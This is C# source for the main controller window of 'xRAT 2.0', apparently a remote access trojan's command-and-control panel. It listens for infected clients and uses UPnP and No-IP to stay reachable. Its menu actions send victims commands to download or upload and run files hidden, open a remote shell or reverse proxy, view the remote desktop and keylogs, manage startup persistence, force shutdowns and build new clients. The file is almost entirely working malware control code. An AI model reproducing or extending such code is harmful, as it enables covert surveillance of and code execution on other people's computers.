﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Commands;
using xServer.Core.Extensions;
using xServer.Core.Helper;
using xServer.Core.Misc;
using xServer.Core.Packets;
using xServer.Settings;

namespace xServer.Forms
{
    public partial class FrmMain : Form
    {
        public Server ListenServer;
        public static volatile FrmMain Instance;
        private readonly Sorter lvwColumnSorter;
        private bool _titleUpdateRunning;

        private void ReadSettings(bool writeIfNotExist = true)
        {
            if (writeIfNotExist)
                XMLSettings.WriteDefaultSettings();

            XMLSettings.ListenPort = ushort.Parse(XMLSettings.ReadValue("ListenPort"));
            XMLSettings.ShowToU = bool.Parse(XMLSettings.ReadValue("ShowToU"));
            XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
            XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
            XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));

            XMLSettings.ShowToolTip = bool.Parse(XMLSettings.ReadValueSafe("ShowToolTip", "False"));
            XMLSettings.IntegrateNoIP = bool.Parse(XMLSettings.ReadValueSafe("EnableNoIPUpdater", "False"));
            XMLSettings.NoIPHost = XMLSettings.ReadValueSafe("NoIPHost");
            XMLSettings.NoIPUsername = XMLSettings.ReadValueSafe("NoIPUsername");
            XMLSettings.NoIPPassword = XMLSettings.ReadValueSafe("NoIPPassword");

            XMLSettings.Password = XMLSettings.ReadValue("Password");
        }

        private void ShowTermsOfService(bool show)
        {
            if (show)
            {
                using (var frm = new FrmTermsOfUse())
                {
                    frm.ShowDialog();
                }
                Thread.Sleep(300);
            }
        }

        public FrmMain()
        {
            if (xServer.Properties.Settings.Default.onJoin == null)
            {
                xServer.Properties.Settings.Default.onJoin = "";
                xServer.Properties.Settings.Default.Save();
            }
            Instance = this;

            ReadSettings();

#if !DEBUG
            ShowTermsOfService(XMLSettings.ShowToU);
#endif

            InitializeComponent();

            this.Menu = mainMenu;

            lvwColumnSorter = new Sorter();
            lstClients.ListViewItemSorter = this.lvwColumnSorter;

            lstClients.RemoveDots();
            lstClients.ChangeTheme();
        }

        public void UpdateWindowTitle(int count, int selected)
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
#if DEBUG
                    if (selected > 0)
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}] - Threads: {2}", count,
                            selected, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
                    else
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} - Threads: {1}", count,
                            System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
#else
                    if (selected > 0)
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", count, selected);
                    else
                        this.Text = string.Format("xRAT 2.0 - Connected: {0}", count);
#endif
                });
            }
            catch
            {
            }
            finally
            {
                _titleUpdateRunning = false;
            }
        }

        private void InitializeServer()
        {
            ListenServer = new Server();

            ListenServer.AddTypesToSerializer(typeof (IPacket), new Type[]
            {
                typeof (Core.Packets.ServerPackets.InitializeCommand),
                typeof (Core.Packets.ServerPackets.Disconnect),
                typeof (Core.Packets.ServerPackets.Reconnect),
                typeof (Core.Packets.ServerPackets.Uninstall),
                typeof (Core.Packets.ServerPackets.DownloadAndExecute),
                typeof (Core.Packets.ServerPackets.UploadAndExecute),
                typeof (Core.Packets.ServerPackets.Desktop),
                typeof (Core.Packets.ServerPackets.GetProcesses),
                typeof (Core.Packets.ServerPackets.KillProcess),
                typeof (Core.Packets.ServerPackets.StartProcess),
                typeof (Core.Packets.ServerPackets.Drives),
                typeof (Core.Packets.ServerPackets.Directory),
                typeof (Core.Packets.ServerPackets.DownloadFile),
                typeof (Core.Packets.ServerPackets.ZipFile),
                typeof (Core.Packets.ServerPackets.MouseClick),
                typeof (Core.Packets.ServerPackets.KeyPress),
                typeof (Core.Packets.ServerPackets.GetSystemInfo),
                typeof (Core.Packets.ServerPackets.VisitWebsite),
                typeof (Core.Packets.ServerPackets.ShowMessageBox),
                typeof (Core.Packets.ServerPackets.Update),
                typeof (Core.Packets.ServerPackets.Monitors),
                typeof (Core.Packets.ServerPackets.ShellCommand),
                typeof (Core.Packets.ServerPackets.Rename),
                typeof (Core.Packets.ServerPackets.Delete),
                typeof (Core.Packets.ServerPackets.Action),
                typeof (Core.Packets.ServerPackets.GetStartupItems),
                typeof (Core.Packets.ServerPackets.AddStartupItem),
                typeof (Core.Packets.ServerPackets.RemoveStartupItem),
                typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
                typeof (Core.Packets.ServerPackets.GetLogs),
                typeof (Core.Packets.ServerPackets.OnJoin),
                typeof (Core.Packets.ClientPackets.Initialize),
                typeof (Core.Packets.ClientPackets.Status),
                typeof (Core.Packets.ClientPackets.UserStatus),
                typeof (Core.Packets.ClientPackets.DesktopResponse),
                typeof (Core.Packets.ClientPackets.GetProcessesResponse),
                typeof (Core.Packets.ClientPackets.DrivesResponse),
                typeof (Core.Packets.ClientPackets.DirectoryResponse),
                typeof (Core.Packets.ClientPackets.DownloadFileResponse),
                typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
                typeof (Core.Packets.ClientPackets.MonitorsResponse),
                typeof (Core.Packets.ClientPackets.ShellCommandResponse),
                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
                typeof (Core.Packets.ClientPackets.GetLogsResponse),
                typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                typeof (Core.ReverseProxy.Packets.ReverseProxyData),
                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
            });

            ListenServer.ServerState += ServerState;
            ListenServer.ClientState += ClientState;
            ListenServer.ClientRead += ClientRead;
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();

            if (XMLSettings.AutoListen)
            {
                if (XMLSettings.UseUPnP)
                    UPnP.ForwardPort(ushort.Parse(XMLSettings.ListenPort.ToString()));
                ListenServer.Listen(XMLSettings.ListenPort);
            }

            if (XMLSettings.IntegrateNoIP)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (ListenServer.Listening)
                ListenServer.Disconnect();

            if (UPnP.IsPortForwarded)
                UPnP.RemovePort();

            nIcon.Visible = false;
            nIcon.Dispose();
            Instance = null;
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle(ListenServer.ConnectedClients, lstClients.SelectedItems.Count);
        }

        private void ServerState(Server server, bool listening)
        {
            try
            {
                this.Invoke((MethodInvoker) delegate { botListen.Text = "Listening: " + listening.ToString(); });
            }
            catch
            {
            }
        }

        private void ClientState(Server server, Client client, bool connected)
        {
            if (connected)
            {
                client.Value = new UserState();
                // Initialize the UserState so we can store values in there if we need to.

                new Core.Packets.ServerPackets.InitializeCommand().Execute(client);
            }
            else
            {
                int selectedClients = 0;
                this.Invoke((MethodInvoker) delegate
                {
                    foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                        .Where(lvi => lvi != null && (lvi.Tag as Client) != null && (Client) lvi.Tag == client))
                    {
                        try
                        {
                            lvi.Remove();
                        }
                        catch
                        {
                        }
                        server.ConnectedClients--;
                    }
                    selectedClients = lstClients.SelectedItems.Count;
                });
                UpdateWindowTitle(server.ConnectedClients, selectedClients);
            }
        }

        private void ClientRead(Server server, Client client, IPacket packet)
        {
            PacketHandler.HandlePacket(client, packet);
        }

        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            if (lstClients.SelectedItems.Count == 0) return clients.ToArray();

            lstClients.Invoke((MethodInvoker)delegate
            {
                clients.AddRange(lstClients.SelectedItems.Cast<ListViewItem>().Where(lvi => lvi != null && (lvi.Tag as Client) != null).Select(lvi => (Client)lvi.Tag));
            });

            return clients.ToArray();
        }

        private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            Sorter sorter = (Sorter)lstClients.ListViewItemSorter;
            if (sorter == null)
            {
                lstClients.ListViewItemSorter = this.lvwColumnSorter;
                Sorter sorter2 = (Sorter)lstClients.ListViewItemSorter;
                sorter2.Column = e.Column;
                if (sorter2.Order == SortOrder.Ascending)
                {
                    sorter2.Order = SortOrder.Descending;
                }
                else
                {
                    sorter2.Order = SortOrder.Ascending;
                }
            }
            else
            {
                sorter.Column = e.Column;
                if (sorter.Order == SortOrder.Ascending)
                {
                    sorter.Order = SortOrder.Descending;
                }
                else
                {
                    sorter.Order = SortOrder.Ascending;
                }
            }
            lstClients.Sort();
        }

        #region "ContextMenu"

        #region "Connection"

        private void ctxtUpdate_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        if (Core.Misc.Update.UseDownload)
                        {
                            foreach (Client c in GetSelectedClients())
                            {
                                new Core.Packets.ServerPackets.Update(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                            }
                        }
                        else
                        {
                            new Thread(() =>
                            {
                                bool error = false;
                                foreach (Client c in GetSelectedClients())
                                {
                                    if (c == null) continue;
                                    if (error) continue;

                                    FileSplit srcFile = new FileSplit(Core.Misc.Update.UploadPath);
                                    var fileName = Helper.GetRandomFilename(8, ".exe");
                                    if (srcFile.MaxBlocks < 0)
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }

                                    int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)

                                    CommandHandler.HandleStatus(c,
                                        new Core.Packets.ClientPackets.Status("Uploading file..."));

                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                    {
                                        byte[] block;
                                        if (!srcFile.ReadBlock(currentBlock, out block))
                                        {
                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                            error = true;
                                            break;
                                        }
                                        new Core.Packets.ServerPackets.Update(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                    }
                                }
                            }).Start();
                        }
                    }
                }
            }
        }

        private void ctxtDisconnect_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.Disconnect().Execute(c);
            }
        }

        private void ctxtReconnect_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.Reconnect().Execute(c);
            }
        }

        private void ctxtUninstall_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    new Core.Packets.ServerPackets.Uninstall().Execute(c);
                }
            }
        }

        #endregion

        #region "System"

        private void ctxtSystemInformation_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmSi != null)
                {
                    c.Value.FrmSi.Focus();
                    return;
                }
                FrmSystemInformation frmSI = new FrmSystemInformation(c);
                frmSI.Show();
            }
        }

        private void ctxtFileManager_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmFm != null)
                {
                    c.Value.FrmFm.Focus();
                    return;
                }
                FrmFileManager frmFM = new FrmFileManager(c);
                frmFM.Show();
            }
        }

        private void ctxtStartupManager_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmStm != null)
                {
                    c.Value.FrmStm.Focus();
                    return;
                }
                FrmStartupManager frmStm = new FrmStartupManager(c);
                frmStm.Show();
            }
        }

        private void ctxtTaskManager_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmTm != null)
                {
                    c.Value.FrmTm.Focus();
                    return;
                }
                FrmTaskManager frmTM = new FrmTaskManager(c);
                frmTM.Show();
            }
        }

        private void ctxtRemoteShell_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRs != null)
                {
                    c.Value.FrmRs.Focus();
                    return;
                }
                FrmRemoteShell frmRS = new FrmRemoteShell(c);
                frmRS.Show();
            }
        }

        private void ctxtReverseProxy_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmProxy != null)
                {
                    c.Value.FrmProxy.Focus();
                    return;
                }

                FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                frmRS.Show();
            }
        }

        private void ctxtRegistryEditor_Click(object sender, EventArgs e)
        {
            // TODO
        }

        private void ctxtShutdown_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.Action(0).Execute(c);
            }
        }

        private void ctxtRestart_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.Action(1).Execute(c);
            }
        }

        private void ctxtStandby_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.Action(2).Execute(c);
            }
        }

        #endregion

        #region "Surveillance"

        private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRdp != null)
                {
                    c.Value.FrmRdp.Focus();
                    return;
                }
                FrmRemoteDesktop frmRDP = new FrmRemoteDesktop(c);
                frmRDP.Show();
            }
        }

        private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
        {
            // TODO
        }

        private void ctxtKeylogger_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmKl != null)
                {
                    c.Value.FrmKl.Focus();
                    return;
                }
                FrmKeylogger frmKL = new FrmKeylogger(c);
                frmKL.Show();
            }
        }

        #endregion

        #region "Miscellaneous"

        private void ctxtLocalFile_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                {
                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
                    {
                        new Thread(() =>
                        {
                            bool error = false;
                            foreach (Client c in GetSelectedClients())
                            {
                                if (c == null) continue;
                                if (error) continue;

                                FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
                                if (srcFile.MaxBlocks < 0)
                                {
                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                        "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    error = true;
                                    break;
                                }

                                int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)

                                CommandHandler.HandleStatus(c,
                                    new Core.Packets.ClientPackets.Status("Uploading file..."));

                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                {
                                    byte[] block;
                                    if (!srcFile.ReadBlock(currentBlock, out block))
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }
                                    new Core.Packets.ServerPackets.UploadAndExecute(ID,
                                        Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
                                        currentBlock, UploadAndExecute.RunHidden, UploadAndExecute.Type).Execute(c);
                                }
                            }
                        }).Start();
                    }
                }
            }
        }

        private void ctxtWebFile_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL,
                                DownloadAndExecute.RunHidden, DownloadAndExecute.Type).Execute(c);
                        }
                    }
                }
            }
        }

        private void ctxtVisitWebsite_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void ctxtShowMessagebox_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            new Core.Packets.ServerPackets.ShowMessageBox(
                                MessageBoxData.Caption, MessageBoxData.Text, MessageBoxData.Button, MessageBoxData.Icon).Execute(c);
                        }
                    }
                }
            }
        }

        #endregion

        #endregion

        #region "MenuStrip"

        private void menuClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void menuSettings_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void menuBuilder_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
        }

        private void menuStatistics_Click(object sender, EventArgs e)
        {
            if (ListenServer.BytesReceived == 0 || ListenServer.BytesSent == 0)
                MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            else
            {
                using (
                    var frm = new FrmStatistics(ListenServer.BytesReceived, ListenServer.BytesSent,
                        ListenServer.ConnectedClients, ListenServer.AllTimeConnectedClients.Count))
                {
                    frm.ShowDialog();
                }
            }
        }

        private void menuAbout_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void nIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion

        private void selectAllClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstClients.Items)
            {
                try
                {
                    if (!lvi.Selected)
                    {
                        lvi.Selected = true;
                    }
                }
                catch (Exception)
                {

                }
            }
        }
        private void menuJoinCommands_Click(object sender, EventArgs e)
        {
            FrmOnJoin frm = new FrmOnJoin();
            frm.ShowDialog();

        }

        private void runJoinCommandsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // Load from settings just in case its a bit larger.
            if (Core.Misc.OnJoinCommands.MainList.Count <= 0)
                Core.Misc.OnJoinCommands.LoadFromSettings();

            if (Core.Misc.OnJoinCommands.MainList.Count <= 0)
                return;

            foreach (Client client in GetSelectedClients())
            {
                new Core.Packets.ServerPackets.OnJoin(Core.Misc.OnJoinCommands.ToDictionary()).Execute(client);
            }
        }

    }
}